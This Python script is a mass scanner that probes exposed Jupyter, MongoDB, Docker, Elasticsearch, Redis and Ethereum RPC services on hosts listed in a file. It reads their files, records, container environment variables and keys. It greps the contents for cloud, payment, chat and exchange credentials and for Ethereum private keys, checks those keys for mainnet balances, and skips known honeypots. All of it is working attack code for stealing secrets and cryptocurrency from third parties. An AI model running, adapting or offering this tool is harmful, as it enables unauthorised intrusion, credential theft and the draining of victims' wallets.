#!/usr/bin/env python3
import json, re, sys
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

TIMEOUT = 6

# Honeypot signatures — these exact balances appear on fake/trap nodes
HONEYPOT_ETH_BALANCES = {
    0.158972490234375,   # mass-deployed Linode honeypot
}
HONEYPOT_CHAINS = {1337, 31337, 8889, 42069, 10946, 1234, 9999}

# High-value key patterns only — no generic hex (too many false positives)
KEY_RE = re.compile(
    r'(AKIA[0-9A-Z]{16}'                                          # AWS access key
    r'|(?:sk|rk)-[a-zA-Z0-9]{20,}'                               # Stripe sk/rk
    r'|sk-[a-zA-Z0-9]{32,}'                                       # OpenAI
    r'|ghp_[a-zA-Z0-9]{36}'                                       # GitHub PAT
    r'|gho_[a-zA-Z0-9]{36}'                                       # GitHub OAuth
    r'|xox[baprs]-[0-9A-Za-z\-]{10,}'                            # Slack
    r'|-----BEGIN [A-Z ]+ KEY-----'                               # PEM key
    r'|AIza[0-9A-Za-z\-_]{35}'                                    # Google API key
    r'|[0-9]{9,10}:[A-Za-z0-9_\-]{35}'                           # Telegram bot token
    r'|(?:AWS_SECRET|aws_secret_access_key)\s*[=:]\s*[^\s"\']{20,}'
    r'|(?:private.?key|eth.?key|wallet.?key|mnemonic|seed.?phrase)\s*[=:"\s]+([0-9a-fA-F]{64})'  # ETH privkey
    r'|(?:0x[0-9a-fA-F]{64})'                                    # ETH privkey with 0x
    r'|(?:binance|bnb|bybit|okx|kraken|coinbase).{0,30}(?:secret|api.?secret)\s*[=:"\s]+([A-Za-z0-9]{32,})'  # exchange secrets
    r'|(?:password|passwd|secret|token|api.?key|private.?key|access.?key)\s*[=:]\s*["\']?([^\s"\'<>]{8,50}))',
    re.IGNORECASE
)

def find_secrets(text):
    return list(set(m.group(0)[:120] for m in KEY_RE.finditer(text)))

def probe_jupyter(ip):
    try:
        r = requests.get(f'http://{ip}:8888/api/contents', timeout=TIMEOUT)
        if r.status_code != 200 or 'content' not in r.text:
            return None
        files = r.json().get('content', [])
        result = {'ip': ip, 'port': 8888, 'type': 'jupyter',
                  'files': [f['name'] for f in files], 'secrets': []}
        for f in files[:15]:
            name = f.get('name', '')
            if not name.endswith(('.ipynb', '.py', '.env', '.cfg', '.json', '.yaml', '.yml')):
                continue
            try:
                nb = requests.get(f'http://{ip}:8888/api/contents/{name}', timeout=TIMEOUT)
                if nb.status_code == 200:
                    secrets = find_secrets(nb.text)
                    if secrets:
                        result['secrets'].extend(secrets[:10])
                        print(f'  JUPYTER SECRETS: {ip} file={name} count={len(secrets)}', flush=True)
                        for s in secrets[:3]:
                            print(f'    -> {s[:80]}', flush=True)
            except:
                pass
        print(f'  JUPYTER: {ip} files={len(files)} secrets={len(result["secrets"])}', flush=True)
        return result
    except:
        return None

def probe_mongo(ip):
    try:
        import pymongo
        client = pymongo.MongoClient(ip, 27017,
            serverSelectionTimeoutMS=TIMEOUT*1000,
            connectTimeoutMS=TIMEOUT*1000,
            socketTimeoutMS=TIMEOUT*1000)
        dbs = client.list_database_names()
        result = {'ip': ip, 'port': 27017, 'type': 'mongo',
                  'databases': dbs, 'collections': {}, 'samples': {}, 'secrets': []}
        for db_name in dbs[:8]:
            if db_name in ('admin', 'local', 'config'):
                continue
            db = client[db_name]
            cols = db.list_collection_names()[:5]
            result['collections'][db_name] = cols
            for col in cols[:3]:
                try:
                    doc = db[col].find_one()
                    if doc:
                        doc.pop('_id', None)
                        sample = str(doc)[:300]
                        result['samples'][f'{db_name}.{col}'] = sample
                        secrets = find_secrets(sample)
                        if secrets:
                            result['secrets'].extend(secrets)
                            print(f'  MONGO SECRETS: {ip} {db_name}.{col}', flush=True)
                except:
                    pass
        print(f'  MONGO: {ip} dbs={dbs}', flush=True)
        return result
    except:
        return None

MAINNET_RPC = 'https://eth.llamarpc.com'

def privkey_to_balance(hex_key):
    try:
        from eth_account import Account
        acct = Account.from_key('0x' + hex_key)
        bal = eth_mainnet_balance(acct.address)
        return acct.address, bal
    except:
        return None, 0

def eth_mainnet_balance(addr):
    try:
        r = requests.post(MAINNET_RPC,
            json={'jsonrpc': '2.0', 'method': 'eth_getBalance',
                  'params': [addr, 'latest'], 'id': 1},
            timeout=TIMEOUT)
        return int(r.json().get('result', '0x0'), 16) / 1e18
    except:
        return 0

def probe_eth(ip):
    try:
        r = requests.post(f'http://{ip}:8545',
            json={'jsonrpc': '2.0', 'method': 'eth_accounts', 'params': [], 'id': 1},
            timeout=TIMEOUT)
        accounts = r.json().get('result', [])
        if not accounts:
            return None

        # Check chain ID — skip testnets
        try:
            chain_r = requests.post(f'http://{ip}:8545',
                json={'jsonrpc': '2.0', 'method': 'eth_chainId', 'params': [], 'id': 1},
                timeout=TIMEOUT)
            chain_id = int(chain_r.json().get('result', '0x0'), 16)
        except:
            chain_id = 0

        result = {'ip': ip, 'port': 8545, 'type': 'eth',
                  'chain_id': chain_id, 'accounts': accounts,
                  'balances': {}, 'total_eth': 0}

        if chain_id in HONEYPOT_CHAINS:
            return None

        # Always verify balance on public chain regardless of chain_id
        # chain_id=0 means eth_chainId failed — still check accounts on mainnet
        funded = False
        for addr in accounts[:10]:
            try:
                eth = eth_mainnet_balance(addr)
                if eth in HONEYPOT_ETH_BALANCES:
                    return None
                if eth > 0:
                    result['balances'][addr] = eth
                    result['total_eth'] += eth
                    funded = True
            except:
                pass

        if funded:
            print(f'  MAINNET FUNDED: {ip} chain={chain_id} total={result["total_eth"]:.4f} ETH', flush=True)
            return result
        return None
    except:
        return None

def probe_docker(ip):
    try:
        r = requests.get(f'http://{ip}:2375/info', timeout=TIMEOUT)
        if 'ServerVersion' not in r.text:
            return None
        info = r.json()
        result = {'ip': ip, 'port': 2375, 'type': 'docker',
                  'version': info.get('ServerVersion'),
                  'containers': info.get('Containers', 0),
                  'running': info.get('ContainersRunning', 0),
                  'secrets': []}
        cts = requests.get(f'http://{ip}:2375/containers/json', timeout=TIMEOUT).json()
        for ct in cts[:8]:
            cid = ct.get('Id', '')[:12]
            image = ct.get('Image', '?')
            try:
                detail = requests.get(
                    f'http://{ip}:2375/containers/{cid}/json', timeout=TIMEOUT).json()
                env = detail.get('Config', {}).get('Env', [])
                for e in env:
                    secrets = find_secrets(e)
                    if secrets:
                        result['secrets'].extend(secrets)
                        print(f'  DOCKER SECRETS: {ip} image={image}: {e[:80]}', flush=True)
                        # Derive ETH address from 64-char hex private keys, check mainnet balance
                        for s in secrets:
                            val = s.split('=')[-1].strip().strip('"\'')
                            if len(val) == 64 and all(c in '0123456789abcdefABCDEF' for c in val):
                                addr, bal = privkey_to_balance(val)
                                if addr:
                                    entry = {'key': val, 'address': addr, 'mainnet_eth': bal}
                                    result.setdefault('eth_keys', []).append(entry)
                                    if bal > 0:
                                        print(f'  ETH KEY FUNDED: {ip} {addr} bal={bal:.4f} ETH', flush=True)
                                    else:
                                        print(f'  ETH KEY (empty): {ip} {addr}', flush=True)
            except:
                pass
        print(f'  DOCKER: {ip} v={info.get("ServerVersion")} running={info.get("ContainersRunning",0)}', flush=True)
        return result
    except:
        return None

def probe_elastic(ip):
    try:
        r = requests.get(f'http://{ip}:9200', timeout=TIMEOUT)
        if 'cluster_name' not in r.text:
            return None
        info = r.json()
        indices_r = requests.get(f'http://{ip}:9200/_cat/indices?format=json', timeout=TIMEOUT)
        indices = [i.get('index') for i in indices_r.json()[:10]] if indices_r.status_code == 200 else []
        result = {'ip': ip, 'port': 9200, 'type': 'elastic',
                  'cluster': info.get('cluster_name'), 'indices': indices, 'secrets': []}
        for idx in [i for i in indices if not i.startswith('.')][:3]:
            try:
                hits = requests.get(
                    f'http://{ip}:9200/{idx}/_search?size=1', timeout=TIMEOUT).json()
                for doc in hits.get('hits', {}).get('hits', []):
                    src = json.dumps(doc.get('_source', {}))
                    secrets = find_secrets(src)
                    if secrets:
                        result['secrets'].extend(secrets)
                        print(f'  ELASTIC SECRETS: {ip} idx={idx}', flush=True)
            except:
                pass
        print(f'  ELASTIC: {ip} cluster={info.get("cluster_name")} indices={len(indices)}', flush=True)
        return result
    except:
        return None

def redis_parse_keys(raw):
    # SCAN response: *2\r\n $N\r\n {cursor}\r\n *M\r\n $K\r\n {key}\r\n ...
    lines = raw.split('\r\n')
    keys = []
    i = 0
    # skip outer *2
    if i < len(lines) and lines[i].startswith('*'):
        i += 1
    # skip cursor: $N + value
    if i < len(lines) and lines[i].startswith('$'):
        i += 2
    # skip key array marker *M
    if i < len(lines) and lines[i].startswith('*'):
        i += 1
    # read key bulk strings
    while i < len(lines):
        if lines[i].startswith('$') and i + 1 < len(lines):
            try:
                if int(lines[i][1:]) > 0:
                    keys.append(lines[i + 1])
                i += 2
            except:
                i += 1
        else:
            i += 1
    return [k for k in keys if k]

def probe_redis(ip):
    try:
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(TIMEOUT)
        s.connect((ip, 6379))

        def send_cmd(*args):
            c = f'*{len(args)}\r\n' + ''.join(f'${len(str(a))}\r\n{a}\r\n' for a in args)
            s.send(c.encode())
            data = b''
            try:
                while True:
                    chunk = s.recv(65536)
                    if not chunk:
                        break
                    data += chunk
                    if len(chunk) < 65536:
                        break
            except:
                pass
            return data.decode('utf-8', errors='replace')

        pong = send_cmd('PING')
        if '+PONG' not in pong:
            s.close()
            return None  # auth required or not Redis

        keys_resp = send_cmd('SCAN', '0', 'COUNT', '200')
        keys = redis_parse_keys(keys_resp)

        secrets = []
        for key in keys[:150]:
            try:
                val = send_cmd('GET', key)
                text = f'{key}={val}'
                found = find_secrets(text)
                if found:
                    secrets.extend(found[:5])
                    print(f'  REDIS SECRET: {ip} key={key[:40]}', flush=True)
                    for sec in found[:2]:
                        print(f'    -> {sec[:80]}', flush=True)
            except:
                pass

        s.close()
        result = {'ip': ip, 'port': 6379, 'type': 'redis', 'keys': len(keys), 'secrets': secrets}
        print(f'  REDIS: {ip} keys_found={len(keys)} secrets={len(secrets)}', flush=True)
        return result if (secrets or len(keys) > 0) else None
    except:
        return None


PROBERS = {
    8888: probe_jupyter,
    27017: probe_mongo,
    8545: probe_eth,
    2375: probe_docker,
    9200: probe_elastic,
    6379: probe_redis,
}

candidates = []
try:
    with open('candidates.txt') as f:
        for line in f:
            line = line.strip()
            if ':' in line:
                parts = line.split(':')
                try:
                    candidates.append((parts[0], int(parts[1])))
                except:
                    pass
except Exception as e:
    print(f'No candidates.txt: {e}')
    sys.exit(0)

# Cap per port so one busy service can't crowd out others
from collections import defaultdict
per_port = defaultdict(list)
for ip, port in candidates:
    per_port[port].append((ip, port))
candidates = []
for port, items in per_port.items():
    candidates.extend(items[:150])  # max 150 per port type

print(f'Deep probing {len(candidates)} candidates (30 workers)...', flush=True)

findings = []
with ThreadPoolExecutor(max_workers=30) as ex:
    futures = {ex.submit(PROBERS[port], ip): (ip, port)
               for ip, port in candidates if port in PROBERS}
    for fut in as_completed(futures):
        try:
            result = fut.result()
            if result:
                findings.append(result)
        except:
            pass

secrets_count = sum(1 for f in findings if f.get('secrets'))
eth_funded = [f for f in findings if f.get('type') == 'eth' and f.get('total_eth', 0) > 0]

print(f'\nTotal findings: {len(findings)}')
print(f'With secrets: {secrets_count}')
print(f'ETH funded: {len(eth_funded)}')
for r in eth_funded:
    print(f'  FUNDED: {r["ip"]} = {r["total_eth"]:.4f} ETH')

with open('findings.txt', 'w') as out:
    for r in findings:
        out.write(json.dumps(r) + '\n')

print(f'Written to findings.txt')
